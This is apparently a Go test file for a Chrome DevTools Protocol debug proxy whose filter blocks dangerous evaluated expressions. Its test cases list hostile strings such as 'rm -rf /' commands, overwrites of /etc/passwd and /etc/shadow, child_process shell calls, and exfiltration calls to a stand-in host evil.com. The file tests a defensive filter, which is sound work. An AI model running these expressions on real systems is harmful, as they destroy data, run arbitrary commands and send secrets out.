package debugproxy

import (
	"encoding/json"
	"testing"
)

func TestFilterLevelStrict(t *testing.T) {
	filter := NewFilter(FilterLevelStrict)

	tests := []struct {
		name    string
		method  string
		params  interface{}
		allowed bool
	}{
		{
			name:    "safe method allowed",
			method:  "Debugger.pause",
			allowed: true,
		},
		{
			name:    "safe method stepOver allowed",
			method:  "Debugger.stepOver",
			allowed: true,
		},
		{
			name:    "Runtime.evaluate blocked in strict",
			method:  "Runtime.evaluate",
			params:  EvaluateParams{Expression: "1+1"},
			allowed: false,
		},
		{
			name:    "Runtime.compileScript blocked",
			method:  "Runtime.compileScript",
			allowed: false,
		},
		{
			name:    "Debugger.setScriptSource blocked",
			method:  "Debugger.setScriptSource",
			allowed: false,
		},
		{
			name:    "Runtime.getProperties allowed",
			method:  "Runtime.getProperties",
			allowed: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			msg := &CDPMessage{
				ID:     1,
				Method: tt.method,
			}

			if tt.params != nil {
				params, _ := json.Marshal(tt.params)
				msg.Params = params
			}

			result := filter.FilterMessage(msg)
			if result.Allowed != tt.allowed {
				t.Errorf("FilterMessage() allowed = %v, want %v (reason: %s)", result.Allowed, tt.allowed, result.Reason)
			}
		})
	}
}

func TestFilterLevelFiltered(t *testing.T) {
	filter := NewFilter(FilterLevelFiltered)

	tests := []struct {
		name       string
		expression string
		allowed    bool
		reason     string
	}{
		{
			name:       "simple expression allowed",
			expression: "1 + 1",
			allowed:    true,
		},
		{
			name:       "variable access allowed",
			expression: "myVar.length",
			allowed:    true,
		},
		{
			name:       "JSON stringify allowed",
			expression: "JSON.stringify(obj)",
			allowed:    true,
		},
		{
			name:       "child_process require blocked",
			expression: "require('child_process')",
			allowed:    false,
			reason:     "child_process",
		},
		{
			name:       "child_process with node: prefix blocked",
			expression: "require('node:child_process')",
			allowed:    false,
			reason:     "child_process",
		},
		{
			name:       "exec blocked",
			expression: "exec('ls -la')",
			allowed:    false,
			reason:     "exec",
		},
		{
			name:       "spawn blocked",
			expression: "spawn('node', ['script.js'])",
			allowed:    false,
			reason:     "spawn",
		},
		{
			name:       "eval blocked",
			expression: "eval('malicious code')",
			allowed:    false,
			reason:     "eval",
		},
		{
			name:       "Function constructor blocked",
			expression: "new Function('return this')()",
			allowed:    false,
			reason:     "Function",
		},
		{
			name:       "fs.writeFile blocked",
			expression: "fs.writeFileSync('/etc/passwd', 'hacked')",
			allowed:    false,
			reason:     "writeFile",
		},
		{
			name:       "fs.unlink blocked",
			expression: "fs.unlink('/important/file')",
			allowed:    false,
			reason:     "unlink",
		},
		{
			name:       "process.binding blocked",
			expression: "process.binding('fs')",
			allowed:    false,
			reason:     "binding",
		},
		{
			name:       "http require blocked",
			expression: "require('http')",
			allowed:    false,
			reason:     "http",
		},
		{
			name:       "fetch blocked",
			expression: "fetch('https://evil.com')",
			allowed:    false,
			reason:     "fetch",
		},
		{
			name:       "WebSocket blocked",
			expression: "new WebSocket('wss://evil.com')",
			allowed:    false,
			reason:     "WebSocket",
		},
		{
			name:       "atob blocked (base64 decode)",
			expression: "atob('bWFsaWNpb3Vz')",
			allowed:    false,
			reason:     "atob",
		},
		{
			name:       "Buffer base64 decode blocked",
			expression: "Buffer.from('data', 'base64')",
			allowed:    false,
			reason:     "base64",
		},
		{
			name:       "shell path blocked",
			expression: "'/bin/bash -c \"rm -rf /\"'",
			allowed:    false,
			reason:     "/bin/bash",
		},
		{
			name:       "powershell blocked",
			expression: "powershell.exe -Command \"Get-Process\"",
			allowed:    false,
			reason:     "powershell",
		},
		{
			name:       "hex escape blocked",
			expression: "\\x63\\x68\\x69\\x6c\\x64",
			allowed:    false,
			reason:     "hex",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			params, _ := json.Marshal(EvaluateParams{Expression: tt.expression})
			msg := &CDPMessage{
				ID:     1,
				Method: "Runtime.evaluate",
				Params: params,
			}

			result := filter.FilterMessage(msg)
			if result.Allowed != tt.allowed {
				t.Errorf("FilterMessage() allowed = %v, want %v (expression: %s, reason: %s)",
					result.Allowed, tt.allowed, tt.expression, result.Reason)
			}
		})
	}
}

func TestFilterLevelAudit(t *testing.T) {
	filter := NewFilter(FilterLevelAudit)

	// In audit mode, everything should be allowed
	tests := []struct {
		name       string
		expression string
	}{
		{"child_process allowed in audit", "require('child_process')"},
		{"eval allowed in audit", "eval('code')"},
		{"exec allowed in audit", "exec('command')"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			params, _ := json.Marshal(EvaluateParams{Expression: tt.expression})
			msg := &CDPMessage{
				ID:     1,
				Method: "Runtime.evaluate",
				Params: params,
			}

			result := filter.FilterMessage(msg)
			if !result.Allowed {
				t.Errorf("FilterMessage() should allow everything in audit mode, got blocked: %s", result.Reason)
			}
		})
	}
}

func TestFilterLevelPassthrough(t *testing.T) {
	filter := NewFilter(FilterLevelPassthrough)

	// In passthrough mode, everything should be allowed including blocked methods
	msg := &CDPMessage{
		ID:     1,
		Method: "Runtime.compileScript",
	}

	result := filter.FilterMessage(msg)
	if !result.Allowed {
		t.Errorf("FilterMessage() should allow everything in passthrough mode")
	}
}

func TestRateLimiter(t *testing.T) {
	filter := NewFilter(FilterLevelFiltered)

	// Send many requests quickly - should eventually get rate limited
	params, _ := json.Marshal(EvaluateParams{Expression: "1+1"})

	allowed := 0
	blocked := 0

	for i := 0; i < 20; i++ {
		msg := &CDPMessage{
			ID:     i,
			Method: "Runtime.evaluate",
			Params: params,
		}

		result := filter.FilterMessage(msg)
		if result.Allowed {
			allowed++
		} else {
			blocked++
		}
	}

	// Should have some allowed and some blocked due to rate limiting
	if allowed == 0 {
		t.Error("Rate limiter blocked everything, expected some allowed")
	}
	if blocked == 0 {
		t.Error("Rate limiter allowed everything, expected some blocked")
	}

	t.Logf("Rate limiter test: %d allowed, %d blocked", allowed, blocked)
}

func TestCallFunctionOnFiltering(t *testing.T) {
	filter := NewFilter(FilterLevelFiltered)

	tests := []struct {
		name                string
		functionDeclaration string
		allowed             bool
	}{
		{
			name:                "safe function allowed",
			functionDeclaration: "function() { return this.length; }",
			allowed:             true,
		},
		{
			name:                "child_process in function blocked",
			functionDeclaration: "function() { return require('child_process').execSync('id'); }",
			allowed:             false,
		},
		{
			name:                "eval in function blocked",
			functionDeclaration: "function() { return eval('malicious'); }",
			allowed:             false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			params, _ := json.Marshal(CallFunctionOnParams{FunctionDeclaration: tt.functionDeclaration})
			msg := &CDPMessage{
				ID:     1,
				Method: "Runtime.callFunctionOn",
				Params: params,
			}

			result := filter.FilterMessage(msg)
			if result.Allowed != tt.allowed {
				t.Errorf("FilterMessage() allowed = %v, want %v", result.Allowed, tt.allowed)
			}
		})
	}
}

func TestBlockedMethods(t *testing.T) {
	filter := NewFilter(FilterLevelFiltered)

	blockedMethods := []string{
		"Runtime.compileScript",
		"Runtime.runScript",
		"Debugger.setScriptSource",
	}

	for _, method := range blockedMethods {
		t.Run("blocked_"+method, func(t *testing.T) {
			msg := &CDPMessage{
				ID:     1,
				Method: method,
			}

			result := filter.FilterMessage(msg)
			if result.Allowed {
				t.Errorf("Method %s should be blocked but was allowed", method)
			}
		})
	}
}

func TestSafeMethods(t *testing.T) {
	filter := NewFilter(FilterLevelStrict) // Even in strict mode, safe methods allowed

	safeMethods := []string{
		"Debugger.enable",
		"Debugger.disable",
		"Debugger.pause",
		"Debugger.resume",
		"Debugger.stepOver",
		"Debugger.stepInto",
		"Debugger.stepOut",
		"Debugger.setBreakpoint",
		"Debugger.setBreakpointByUrl",
		"Debugger.removeBreakpoint",
		"Debugger.getScriptSource",
		"Runtime.enable",
		"Runtime.disable",
		"Runtime.getProperties",
		"Runtime.releaseObject",
	}

	for _, method := range safeMethods {
		t.Run("safe_"+method, func(t *testing.T) {
			msg := &CDPMessage{
				ID:     1,
				Method: method,
			}

			result := filter.FilterMessage(msg)
			if !result.Allowed {
				t.Errorf("Method %s should be allowed but was blocked: %s", method, result.Reason)
			}
		})
	}
}

func TestCDPMessageParsing(t *testing.T) {
	tests := []struct {
		name     string
		json     string
		expected *CDPMessage
		hasError bool
	}{
		{
			name: "valid request",
			json: `{"id":1,"method":"Debugger.pause"}`,
			expected: &CDPMessage{
				ID:     1,
				Method: "Debugger.pause",
			},
			hasError: false,
		},
		{
			name: "request with params",
			json: `{"id":2,"method":"Runtime.evaluate","params":{"expression":"1+1"}}`,
			expected: &CDPMessage{
				ID:     2,
				Method: "Runtime.evaluate",
			},
			hasError: false,
		},
		{
			name:     "invalid json",
			json:     `{invalid}`,
			hasError: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			msg, err := ParseMessage([]byte(tt.json))

			if tt.hasError {
				if err == nil {
					t.Error("Expected error but got none")
				}
				return
			}

			if err != nil {
				t.Errorf("Unexpected error: %v", err)
				return
			}

			if msg.ID != tt.expected.ID {
				t.Errorf("ID = %d, want %d", msg.ID, tt.expected.ID)
			}
			if msg.Method != tt.expected.Method {
				t.Errorf("Method = %s, want %s", msg.Method, tt.expected.Method)
			}
		})
	}
}

func TestCreateErrorResponse(t *testing.T) {
	resp := CreateErrorResponse(42, -32600, "test error")

	if resp.ID != 42 {
		t.Errorf("ID = %d, want 42", resp.ID)
	}
	if resp.Error == nil {
		t.Fatal("Error should not be nil")
	}
	if resp.Error.Code != -32600 {
		t.Errorf("Error.Code = %d, want -32600", resp.Error.Code)
	}
	if resp.Error.Message != "test error" {
		t.Errorf("Error.Message = %s, want 'test error'", resp.Error.Message)
	}
}

func TestDangerousPatternsComprehensive(t *testing.T) {
	// Test various obfuscation attempts that should be caught
	dangerousExpressions := []string{
		// Direct requires
		`require("child_process")`,
		`require('child_process')`,
		`require("node:child_process")`,
		
		// Spaced requires
		`require( "child_process" )`,
		`require(  'child_process'  )`,
		
		// Process methods
		`process.binding("fs")`,
		`process.dlopen("./malicious.node")`,
		`process.kill(1)`,
		`process.exit(1)`,
		
		// Command execution
		`exec("rm -rf /")`,
		`execSync("whoami")`,
		`spawn("sh", ["-c", "id"])`,
		`spawnSync("bash")`,
		`fork("./worker.js")`,
		
		// File system destruction
		`fs.writeFile("/etc/passwd", "data", () => {})`,
		`fs.writeFileSync("/etc/shadow", "x")`,
		`fs.unlink("/important")`,
		`fs.rmdir("/data")`,
		`fs.rm("/", {recursive: true})`,
		
		// Network exfiltration
		`require("http").get("http://evil.com")`,
		`require("https").request("https://evil.com")`,
		`require("net").connect(1337, "evil.com")`,
		`fetch("https://evil.com/steal?data=" + secret)`,
		`new XMLHttpRequest()`,
		`new WebSocket("wss://evil.com")`,
		
		// Dynamic code execution
		`eval("require('child_process')")`,
		`new Function("return process")()`,
		`Function("return this")()`,
		`vm.runInThisContext("code")`,
		
		// Shell references
		`"/bin/sh"`,
		`"/bin/bash -c"`,
		`"cmd.exe /c"`,
		`"powershell -Command"`,
		
		// Library references
		`shelljs`,
		`execa("command")`,
	}

	for _, expr := range dangerousExpressions {
		blocked, reason := checkDangerousPatterns(expr)
		if !blocked {
			t.Errorf("Expression should be blocked but wasn't: %s", expr)
		} else {
			t.Logf("Correctly blocked: %s (reason: %s)", expr, reason)
		}
	}
}

func TestSafeExpressionsAllowed(t *testing.T) {
	safeExpressions := []string{
		// Arithmetic
		`1 + 1`,
		`Math.sqrt(16)`,
		`Math.max(1, 2, 3)`,
		
		// String operations
		`"hello".toUpperCase()`,
		`str.length`,
		`str.split(",")`,
		
		// Array operations
		`arr.map(x => x * 2)`,
		`arr.filter(x => x > 0)`,
		`arr.reduce((a, b) => a + b, 0)`,
		
		// Object access
		`obj.property`,
		`obj["key"]`,
		`Object.keys(obj)`,
		
		// JSON
		`JSON.stringify(obj)`,
		`JSON.parse(str)`,
		
		// Type checking
		`typeof x`,
		`x instanceof Array`,
		`Array.isArray(x)`,
		
		// Debugging helpers
		`console.log(x)`,
		`debugger`,
		
		// Common patterns in VS Code debugging
		`this`,
		`arguments`,
		`__proto__`,
		`constructor.name`,
	}

	for _, expr := range safeExpressions {
		blocked, reason := checkDangerousPatterns(expr)
		if blocked {
			t.Errorf("Safe expression was incorrectly blocked: %s (reason: %s)", expr, reason)
		}
	}
}
